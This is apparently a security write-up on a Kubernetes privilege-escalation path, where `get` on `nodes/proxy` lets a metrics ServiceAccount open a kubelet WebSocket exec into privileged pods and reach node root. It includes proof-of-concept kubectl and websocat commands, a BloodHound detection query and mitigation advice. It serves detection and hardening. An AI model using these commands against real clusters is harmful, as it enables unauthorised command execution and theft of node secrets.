### Summary
A subject granted only `get` on `nodes/proxy` - typical for monitoring and metrics scrapers - can run commands in any container on any node. `nodes/proxy` forwards requests through the API server to the kubelet API, and the API server authorizes them by HTTP method only: a WebSocket upgrade is a `GET`, so the kubelet's `/exec` endpoint is reachable without `create` on `nodes/proxy` and without any `pods/exec` permission. The request reaches the kubelet as the API server's own kubelet client identity, so the kubelet allows it.

### Details
1. ServiceAccount `metrics-scraper` (namespace `03-nodes-proxy-exec`) is bound cluster-wide to ClusterRole `03-node-metrics-reader`: `get`/`list` on `nodes`, `get` on `nodes/proxy`. Nothing on pods.
2. Pod `metrics-scraper` runs with that ServiceAccount's token mounted.
3. Pod `node-agent` is a privileged, `hostPID` node agent - a stand-in for the CNI, log-shipping or security agents found on most nodes.
4. With the token, the attacker lists nodes, asks each kubelet for its running pods (`/runningpods/`), and opens a WebSocket `exec` into `node-agent` through `nodes/proxy`.
5. From the privileged `hostPID` container, `nsenter` into PID 1 gives a root shell on the node.

### PoC
Deploy:

```
$ kubectl apply -f 03-sa-nodes-proxy-kubelet-exec.yaml
```

Confirm the identity has no pod access at all:

```
$ SA=system:serviceaccount:03-nodes-proxy-exec:metrics-scraper
$ kubectl auth can-i create pods/exec --as=$SA -A
no
$ kubectl auth can-i get pods --as=$SA -A
no
$ kubectl auth can-i get nodes/proxy --as=$SA
yes
```

Use its token from outside the cluster (here minted with `create token`; the token mounted in `metrics-scraper` works the same way):

```
$ export API="https://<API_SERVER>:6443"
$ export TOKEN=$(kubectl -n 03-nodes-proxy-exec create token metrics-scraper)
$ alias k='kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN --kubeconfig <(echo)'
```

Find nodes, then ask each kubelet which pods it runs - this bypasses the missing `pods` permission:

```
$ k get nodes -o name
node/master-1
node/node-1

$ k get --raw "/api/v1/nodes/node-1/proxy/runningpods/" | grep -o '"name":"node-agent","namespace":"[^"]*"'
"name":"node-agent","namespace":"03-nodes-proxy-exec"
```

A normal `exec` (POST, which `kubectl create --raw` sends) is denied, because it needs `create` on `nodes/proxy`:

```
$ k create --raw "/api/v1/nodes/node-1/proxy/exec/03-nodes-proxy-exec/node-agent/agent?command=id&output=1" -f /dev/null
Error from server (Forbidden): nodes "node-1" is forbidden: User "system:serviceaccount:03-nodes-proxy-exec:metrics-scraper" cannot create resource "nodes/proxy" in API group "" at the cluster scope
```

The same endpoint as a `GET` passes authorization and reaches the kubelet, which only refuses it because `/exec` requires a protocol upgrade - something `kubectl --raw` can't send:

```
$ k get --raw "/api/v1/nodes/node-1/proxy/exec/03-nodes-proxy-exec/node-agent/agent?command=id&output=1"
Error from server (InternalError): an error on the server ("Upgrade request required") has prevented the request from succeeding
```

The same token is accepted by the kubelet directly (port 10250 on the node). With [websocat](https://github.com/vi/websocat):

```
$ websocat --insecure --protocol v4.channel.k8s.io -H "Authorization: Bearer $TOKEN" "wss://<NODE_IP>:10250/exec/03-nodes-proxy-exec/node-agent/agent?output=1&error=1&command=id"
```

### Impact
`get` on `nodes/proxy` is equivalent to `exec` into every pod on every node, including privileged system pods, which leads to node root and from there to every ServiceAccount token and Secret mounted on the node. The exec goes through the kubelet, so it does not show up as a `pods/exec` request in API server audit logs and is not covered by policies that only restrict `pods/exec`.

### KuberHound Detection
`get`, `create` or `*` on `nodes/proxy` (or on resource `*`) sets the `NODE_PROXY` attack capability on the ClusterRole. For ClusterRoles bound via a ClusterRoleBinding, KuberHound creates a `CAN_EXEC_VIA_NODE_PROXY` edge to every node, which connects to the existing `HOSTS_POD` edges:

```cypher
MATCH p=(identity)-[:BOUND_TO]->(r)-[:CAN_EXEC_VIA_NODE_PROXY]->(n:K8sNode)
RETURN p
```

Search **"KuberHound: Kubelet exec via nodes/proxy"** in BloodHound. Expected path:

- `metrics-scraper (pod) -> metrics-scraper (SA) -> 03-node-metrics-reader -> {master-1, node-1}`

From a node, `HOSTS_POD` continues to `node-agent` and every other pod on it.

### Advisories
Not a CVE - Kubernetes documents that access to the `proxy` subresource of Nodes grants the kubelet API, including command execution in every pod on the node:
https://kubernetes.io/docs/concepts/security/rbac-good-practices/#access-to-proxy-subresource-of-nodes

Research on `get` on `nodes/proxy` leading to command execution:
https://grahamhelton.com/blog/nodes-proxy-rce

Grant monitoring agents narrower kubelet subresources (`nodes/metrics`, `nodes/stats`) instead of `nodes/proxy` where the Kubernetes version and kubelet authorization support it.
